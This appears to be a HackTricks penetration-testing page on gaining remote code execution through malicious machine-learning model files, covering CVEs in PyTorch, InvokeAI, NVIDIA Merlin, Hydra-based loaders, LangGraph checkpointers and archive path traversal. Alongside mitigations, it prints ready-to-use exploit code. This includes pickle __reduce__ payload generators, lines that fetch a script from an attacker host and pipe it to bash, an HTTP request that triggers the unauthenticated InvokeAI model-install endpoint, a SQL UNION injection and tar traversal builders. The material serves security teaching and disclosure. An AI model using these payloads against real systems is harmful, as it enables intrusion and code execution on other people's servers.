# Models RCE

{{#include ../banners/hacktricks-training.md}}

## Loading models to RCE

Machine Learning models are usually shared in different formats, such as ONNX, TensorFlow, PyTorch, etc. These models can be loaded into developers machines or production systems to use them. Usually the models sholdn't contain malicious code, but there are some cases where the model can be used to execute arbitrary code on the system as intended feature or because of a vulnerability in the model loading library.

At the time of the writting these are some examples of this type of vulneravilities:

| **Framework / Tool**        | **Vulnerability (CVE if available)**                                                    | **RCE Vector**                                                                                                                           | **References**                               |
|-----------------------------|------------------------------------------------------------------------------------------------------------------------------|------------------------------------------------------------------------------------------------------------------------------------------|----------------------------------------------|
| **PyTorch** (Python)        | *Insecure deserialization in* `torch.load` **(CVE-2025-32434)**                                                              | Malicious pickle in model checkpoint leads to code execution (bypassing `weights_only` safeguard)                                        | |
| PyTorch **TorchServe**      | *ShellTorch* – **CVE-2023-43654**, **CVE-2022-1471**                                                                         | SSRF + malicious model download causes code execution; Java deserialization RCE in management API                                        | |
| **NVIDIA Merlin Transformers4Rec** | Unsafe checkpoint deserialization via `torch.load` **(CVE-2025-23298)**                                           | Untrusted checkpoint triggers pickle reducer during `load_model_trainer_states_from_checkpoint` → code execution in ML worker            | [ZDI-25-833](https://www.zerodayinitiative.com/advisories/ZDI-25-833/) |
| **LangGraph** (SQLite/Redis checkpointers) | SQLi + unsafe MessagePack extension hook **(CVE-2025-67644, CVE-2026-28277, CVE-2026-27022)** | User-controlled `filter` key injects SQL/JSON-path syntax, `UNION SELECT` fabricates a fake checkpoint row, then `msgpack` deserialization imports and calls attacker-chosen Python code | [Check Point 2026](https://research.checkpoint.com/2026/from-sqli-to-rce-exploiting-langgraphs-checkpointer/) |
| **TensorFlow/Keras**        | **CVE-2021-37678** (unsafe YAML) <br> **CVE-2024-3660** (Keras Lambda)                                                      | Loading model from YAML uses `yaml.unsafe_load` (code exec) <br> Loading model with **Lambda** layer runs arbitrary Python code          | |
| TensorFlow (TFLite)         | **CVE-2022-23559** (TFLite parsing)                                                                                          | Crafted `.tflite` model triggers integer overflow → heap corruption (potential RCE)                                                      | |
| **Scikit-learn** (Python)   | **CVE-2020-13092** (joblib/pickle)                                                                                           | Loading a model via `joblib.load` executes pickle with attacker’s `__reduce__` payload                                                   | |
| **NumPy** (Python)          | **CVE-2019-6446** (unsafe `np.load`) *disputed*                                                                              | `numpy.load` default allowed pickled object arrays – malicious `.npy/.npz` triggers code exec                                            | |
| **ONNX / ONNX Runtime**     | **CVE-2022-25882** (dir traversal) <br> **CVE-2024-5187** (tar traversal)                                                    | ONNX model’s external-weights path can escape directory (read arbitrary files) <br> Malicious ONNX model tar can overwrite arbitrary files (leading to RCE) | |
| ONNX Runtime (design risk)  | *(No CVE)* ONNX custom ops / control flow                                                                                    | Model with custom operator requires loading attacker’s native code; complex model graphs abuse logic to execute unintended computations   | |
| **NVIDIA Triton Server**    | **CVE-2023-31036** (path traversal)                                                                                          | Using model-load API with `--model-control` enabled allows relative path traversal to write files (e.g., overwrite `.bashrc` for RCE)    | |
| **GGML (GGUF format)**      | **CVE-2024-25664 … 25668** (multiple heap overflows)                                                                         | Malformed GGUF model file causes heap buffer overflows in parser, enabling arbitrary code execution on victim system                     | |
| **Keras (older formats)**   | *(No new CVE)* Legacy Keras H5 model                                                                                         | Malicious HDF5 (`.h5`) model with Lambda layer code still executes on load (Keras safe_mode doesn’t cover old format – “downgrade attack”) | |
| **Others** (general)        | *Design flaw* – Pickle serialization                                                                                         | Many ML tools (e.g., pickle-based model formats, Python `pickle.load`) will execute arbitrary code embedded in model files unless mitigated | |
| **NeMo / uni2TS / FlexTok (Hydra)** | Untrusted metadata passed to `hydra.utils.instantiate()` **(CVE-2025-23304, CVE-2026-22584, FlexTok)** | Attacker-controlled model metadata/config sets `_target_` to arbitrary callable (e.g., `builtins.exec`) → executed during load, even with “safe” formats (`.safetensors`, `.nemo`, repo `config.json`) | [Unit42 2026](https://unit42.paloaltonetworks.com/rce-vulnerabilities-in-ai-python-libraries/) |

Moreover, there some python pickle based models like the ones used by [PyTorch](https://github.com/pytorch/pytorch/security) that can be used to execute arbitrary code on the system if they are not loaded with `weights_only=True`. So, any pickle based model might be specially susceptible to this type of attacks, even if they are not listed in the table above.

### Hydra metadata → RCE (works even with safetensors)

`hydra.utils.instantiate()` imports and calls any dotted `_target_` in a configuration/metadata object. When libraries feed **untrusted model metadata** into `instantiate()`, an attacker can supply a callable and arguments that run immediately during model load (no pickle required).

Payload example (works in `.nemo` `model_config.yaml`, repo `config.json`, or `__metadata__` inside `.safetensors`):

```yaml
_target_: builtins.exec
_args_:
  - "import os; os.system('curl http://ATTACKER/x|bash')"
```

Key points:
- Triggered before model initialization in NeMo `restore_from/from_pretrained`, uni2TS HuggingFace coders, and FlexTok loaders.
- Hydra’s string block-list is bypassable via alternative import paths (e.g., `enum.bltns.eval`) or application-resolved names (e.g., `nemo.core.classes.common.os.system` → `posix`).
- FlexTok also parses stringified metadata with `ast.literal_eval`, enabling DoS (CPU/memory blowup) before the Hydra call.

### 🆕  InvokeAI RCE via `torch.load` (CVE-2024-12029)

`InvokeAI` is a popular open-source web interface for Stable-Diffusion. Versions **5.3.1 – 5.4.2** expose the REST endpoint `/api/v2/models/install` that lets users download and load models from arbitrary URLs.

Internally the endpoint eventually calls:

```python
checkpoint = torch.load(path, map_location=torch.device("meta"))
```

When the supplied file is a **PyTorch checkpoint (`*.ckpt`)**, `torch.load` performs a **pickle deserialization**.  Because the content comes directly from the user-controlled URL, an attacker can embed a malicious object with a custom `__reduce__` method inside the checkpoint; the method is executed **during deserialization**, leading to **remote code execution (RCE)** on the InvokeAI server.

The vulnerability was assigned **CVE-2024-12029** (CVSS 9.8, EPSS 61.17 %).

#### Exploitation walk-through

1. Create a malicious checkpoint:

```python
# payload_gen.py
import pickle, torch, os

class Payload:
    def __reduce__(self):
        return (os.system, ("/bin/bash -c 'curl http://ATTACKER/pwn.sh|bash'",))

with open("payload.ckpt", "wb") as f:
    pickle.dump(Payload(), f)
```

2. Host `payload.ckpt` on an HTTP server you control (e.g. `http://ATTACKER/payload.ckpt`).
3. Trigger the vulnerable endpoint (no authentication required):

```python
import requests

requests.post(
    "http://TARGET:9090/api/v2/models/install",
    params={
        "source": "http://ATTACKER/payload.ckpt",  # remote model URL
        "inplace": "true",                         # write inside models dir
        # the dangerous default is scan=false → no AV scan
    },
    json={},                                         # body can be empty
    timeout=5,
)
```

4. When InvokeAI downloads the file it calls `torch.load()` → the `os.system` gadget runs and the attacker gains code execution in the context of the InvokeAI process.

Ready-made exploit: **Metasploit** module `exploit/linux/http/invokeai_rce_cve_2024_12029` automates the whole flow.

#### Conditions

•  InvokeAI 5.3.1-5.4.2 (scan flag default **false**)
•  `/api/v2/models/install` reachable by the attacker
•  Process has permissions to execute shell commands

#### Mitigations

* Upgrade to **InvokeAI ≥ 5.4.3** – the patch sets `scan=True` by default and performs malware scanning before deserialization.
* When loading checkpoints programmatically use `torch.load(file, weights_only=True)` or the new [`torch.load_safe`](https://pytorch.org/docs/stable/serialization.html#security) helper.
* Enforce allow-lists / signatures for model sources and run the service with least-privilege.

> ⚠️ Remember that **any** Python pickle-based format (including many `.pt`, `.pkl`, `.ckpt`, `.pth` files) is inherently unsafe to deserialize from untrusted sources.

---

Example of an ad-hoc mitigation if you must keep older InvokeAI versions running behind a reverse proxy:

```nginx
location /api/v2/models/install {
    deny all;                       # block direct Internet access
    allow 10.0.0.0/8;               # only internal CI network can call it
}
```

### 🆕 NVIDIA Merlin Transformers4Rec RCE via unsafe `torch.load` (CVE-2025-23298)

NVIDIA’s Transformers4Rec (part of Merlin) exposed an unsafe checkpoint loader that directly called `torch.load()` on user-provided paths. Because `torch.load` relies on Python `pickle`, an attacker-controlled checkpoint can execute arbitrary code via a reducer during deserialization.

Vulnerable path (pre-fix): `transformers4rec/torch/trainer/trainer.py` → `load_model_trainer_states_from_checkpoint(...)` → `torch.load(...)`.

Why this leads to RCE: In Python pickle, an object can define a reducer (`__reduce__`/`__setstate__`) that returns a callable and arguments. The callable is executed during unpickling. If such an object is present in a checkpoint, it runs before any weights are used.

Minimal malicious checkpoint example:

```python
import torch

class Evil:
    def __reduce__(self):
        import os
        return (os.system, ("id > /tmp/pwned",))

# Place the object under a key guaranteed to be deserialized early
ckpt = {
    "model_state_dict": Evil(),
    "trainer_state": {"epoch": 10},
}

torch.save(ckpt, "malicious.ckpt")
```

Delivery vectors and blast radius:
- Trojanized checkpoints/models shared via repos, buckets, or artifact registries
- Automated resume/deploy pipelines that auto-load checkpoints
- Execution happens inside training/inference workers, often with elevated privileges (e.g., root in containers)

Fix: Commit [b7eaea5](https://github.com/NVIDIA-Merlin/Transformers4Rec/pull/802/commits/b7eaea527d6ef46024f0a5086bce4670cc140903) (PR #802) replaced the direct `torch.load()` with a restricted, allow-listed deserializer implemented in `transformers4rec/utils/serialization.py`. The new loader validates types/fields and prevents arbitrary callables from being invoked during load.

Defensive guidance specific to PyTorch checkpoints:
- Do not unpickle untrusted data. Prefer non-executable formats like [Safetensors](https://huggingface.co/docs/safetensors/index) or ONNX when possible.
- If you must use PyTorch serialization, ensure `weights_only=True` (supported in newer PyTorch) or use a custom allow-listed unpickler similar to the Transformers4Rec patch.
- Enforce model provenance/signatures and sandbox deserialization (seccomp/AppArmor; non-root user; restricted FS and no network egress).
- Monitor for unexpected child processes from ML services at checkpoint load time; trace `torch.load()`/`pickle` usage.

POC and vulnerable/patch references:
- Vulnerable pre-patch loader: https://gist.github.com/zdi-team/56ad05e8a153c84eb3d742e74400fd10.js
- Malicious checkpoint POC: https://gist.github.com/zdi-team/fde7771bb93ffdab43f15b1ebb85e84f.js
- Post-patch loader: https://gist.github.com/zdi-team/a0648812c52ab43a3ce1b3a090a0b091.js

## Example – crafting a malicious PyTorch model

- Create the model:

```python
# attacker_payload.py
import torch
import os

class MaliciousPayload:
    def __reduce__(self):
        # This code will be executed when unpickled (e.g., on model.load_state_dict)
        return (os.system, ("echo 'You have been hacked!' > /tmp/pwned.txt",))

# Create a fake model state dict with malicious content
malicious_state = {"fc.weight": MaliciousPayload()}

# Save the malicious state dict
torch.save(malicious_state, "malicious_state.pth")
```

- Load the model:

```python
# victim_load.py
import torch
import torch.nn as nn

class MyModel(nn.Module):
    def __init__(self):
        super().__init__()
        self.fc = nn.Linear(10, 1)

model = MyModel()

# ⚠️ This will trigger code execution from pickle inside the .pth file
model.load_state_dict(torch.load("malicious_state.pth", weights_only=False))

# /tmp/pwned.txt is created even if you get an error
```

### Deserialization Tencent FaceDetection-DSFD resnet (CVE-2025-13715 / ZDI-25-1183)

Tencent’s FaceDetection-DSFD exposes a `resnet` endpoint that deserializes user-controlled data. ZDI confirmed that a remote attacker can coerce a victim to load a malicious page/file, have it push a crafted serialized blob to that endpoint, and trigger deserialization as `root`, leading to full compromise.

The exploit flow mirrors typical pickle abuse:

```python
import pickle, os, requests

class Payload:
    def __reduce__(self):
        return (os.system, ("curl https://attacker/p.sh | sh",))

blob = pickle.dumps(Payload())
requests.post("https://target/api/resnet", data=blob,
              headers={"Content-Type": "application/octet-stream"})
```

Any gadget reachable during deserialization (constructors, `__setstate__`, framework callbacks, etc.) can be weaponized the same way, regardless of whether the transport was HTTP, WebSocket, or a file dropped into a watched directory.



### LangGraph checkpointer SQLi → MessagePack RCE

This attack chain is interesting because the attacker **doesn't need to upload a malicious model file**. Instead, the application exposes an **AI-agent persistence API** (`get_state_history(..., filter=...)`) and user input reaches the checkpointer query builder.

#### 1. Structural SQLi in metadata filters

A vulnerable SQLite pattern looked like:

```python
for query_key, query_value in filter.items():
    operator, param_value = _where_value(query_value)
    predicates.append(
        f"json_extract(CAST(metadata AS TEXT), '$.{query_key}') {operator}"
    )
```

The value is bound later, but `query_key` is concatenated into the **JSON path string**, so a `'` inside the dictionary key breaks out of `'$.{query_key}'` and injects SQL. Same lesson applies to **JSON paths, identifiers, operators, `LIMIT`, and TTL fields**: placeholders only protect values, not structural query syntax.

#### 2. `UNION SELECT` can target downstream sinks, not just data theft

The query returns `type` and serialized `checkpoint` bytes, which are later consumed as:

```python
self.serde.loads_typed((type, checkpoint))
```

That means a SQLi in the `WHERE` clause can inject a **fake result row**:

```sql
UNION SELECT 'thread1', 'ns', 'checkpoint1', NULL, 'msgpack', X'<payload>', '{}'
```

If later code parses, deserializes, writes, or executes any selected column, map those columns to their sinks. In this case the fake row turns SQLi into **attacker-controlled deserialization**.

#### 3. Unsafe MessagePack extension hooks are equivalent to code gadgets

LangGraph's `msgpack` path used a custom extension hook that unpacked a nested tuple and executed:

```python
getattr(importlib.import_module(tup[0]), tup[1])(tup[2])
```

So a MessagePack extension object encoding something equivalent to `("os", "system", "id > /tmp/pwned")` imports `os`, resolves `system`, and runs the command. When reviewing AI frameworks, inspect **custom MessagePack/JSON/pickle revivers** for dynamic imports, reflection, or arbitrary callable dispatch.

#### 4. Practical audit pattern for agent frameworks

Review any user-controlled input that reaches:
- state history / memory / replay / checkpoint listing APIs
- structured filter builders that generate SQL or Redis query fragments
- custom deserializers (`pickle`, `msgpack`, `json` object hooks, YAML constructors)
- recovery paths that trust rows returned from the persistence layer

This specific chain affected self-hosted LangGraph deployments using **SQLite** or **Redis** checkpointers when untrusted users could control `filter`. Patched versions noted in the disclosure were `langgraph-checkpoint-sqlite 3.0.1+`, `langgraph 1.0.10+`, `langgraph-checkpoint-redis 1.0.2+`, and `langgraph-checkpoint 4.0.1+`.

## Models to Path Traversal

As commented in [**this blog post**](https://blog.huntr.com/pivoting-archive-slip-bugs-into-high-value-ai/ml-bounties), most models formats used by different AI frameworks are based on archives, usually `.zip`. Therefore, it might be possible to abuse these formats to perform path traversal attacks, allowing to read arbitrary files from the system where the model is loaded.

For example, with the following code you can create a model that will create a file in the `/tmp` directory when loaded:

```python
import tarfile

def escape(member):
    member.name = "../../tmp/hacked"     # break out of the extract dir
    return member

with tarfile.open("traversal_demo.model", "w:gz") as tf:
    tf.add("harmless.txt", filter=escape)
```

Or, with the following code you can create a model that will create a symlink to the `/tmp` directory when loaded:

```python
import tarfile, pathlib

TARGET  = "/tmp"        # where the payload will land
PAYLOAD = "abc/hacked"

def link_it(member):
    member.type, member.linkname = tarfile.SYMTYPE, TARGET
    return member

with tarfile.open("symlink_demo.model", "w:gz") as tf:
    tf.add(pathlib.Path(PAYLOAD).parent, filter=link_it)
    tf.add(PAYLOAD)                      # rides the symlink
```

### Deep-dive: Keras .keras deserialization and gadget hunting

For a focused guide on .keras internals, Lambda-layer RCE, the arbitrary import issue in ≤ 3.8, and post-fix gadget discovery inside the allowlist, see:


{{#ref}}
../generic-methodologies-and-resources/python/keras-model-deserialization-rce-and-gadget-hunting.md
{{#endref}}

## References

- [OffSec blog – "CVE-2024-12029 – InvokeAI Deserialization of Untrusted Data"](https://www.offsec.com/blog/cve-2024-12029/)
- [InvokeAI patch commit 756008d](https://github.com/invoke-ai/invokeai/commit/756008dc5899081c5aa51e5bd8f24c1b3975a59e)
- [Rapid7 Metasploit module documentation](https://www.rapid7.com/db/modules/exploit/linux/http/invokeai_rce_cve_2024_12029/)
- [PyTorch – security considerations for torch.load](https://pytorch.org/docs/stable/notes/serialization.html#security)
- [ZDI blog – CVE-2025-23298 Getting Remote Code Execution in NVIDIA Merlin](https://www.thezdi.com/blog/2025/9/23/cve-2025-23298-getting-remote-code-execution-in-nvidia-merlin)
- [ZDI advisory: ZDI-25-833](https://www.zerodayinitiative.com/advisories/ZDI-25-833/)
- [Transformers4Rec patch commit b7eaea5 (PR #802)](https://github.com/NVIDIA-Merlin/Transformers4Rec/pull/802/commits/b7eaea527d6ef46024f0a5086bce4670cc140903)
- [Pre-patch vulnerable loader (gist)](https://gist.github.com/zdi-team/56ad05e8a153c84eb3d742e74400fd10.js)
- [Malicious checkpoint PoC (gist)](https://gist.github.com/zdi-team/fde7771bb93ffdab43f15b1ebb85e84f.js)
- [Post-patch loader (gist)](https://gist.github.com/zdi-team/a0648812c52ab43a3ce1b3a090a0b091.js)
- [Hugging Face Transformers](https://github.com/huggingface/transformers)
- [Unit 42 – Remote Code Execution With Modern AI/ML Formats and Libraries](https://unit42.paloaltonetworks.com/rce-vulnerabilities-in-ai-python-libraries/)
- [Hydra instantiate docs](https://hydra.cc/docs/advanced/instantiate_objects/overview/)
- [Hydra block-list commit (warning about RCE)](https://github.com/facebookresearch/hydra/commit/4d30546745561adf4e92ad897edb2e340d5685f0)
- [Check Point Research – From SQLi to RCE: Exploiting LangGraph's Checkpointer](https://research.checkpoint.com/2026/from-sqli-to-rce-exploiting-langgraphs-checkpointer/)

{{#include ../banners/hacktricks-training.md}}
